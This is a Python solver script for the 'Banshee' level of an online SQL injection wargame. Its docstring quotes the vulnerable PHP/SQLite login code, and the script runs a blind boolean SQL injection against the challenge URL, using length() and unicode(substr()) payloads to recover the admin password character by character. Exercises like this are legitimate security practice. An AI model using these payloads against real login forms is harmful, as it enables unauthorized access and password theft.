#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'login success!' in args[0]


def main():
    """
    Banshee 39

    if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['id']) echo "<h2>login success!</h2>";

    $query = "select pw from member where id='admin'";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("banshee");
    """

    url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "' or length(pw)>%s-- "
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"' or unicode(substr(pw,%d,1))<%s-- "
    result = p.find_binary(check_func, len_of_key)

    p.payload = result
    response = p.my_request()
    if 'Clear!' in response:
        print('\nBanshee Clear!')


if __name__ == '__main__':
    main()
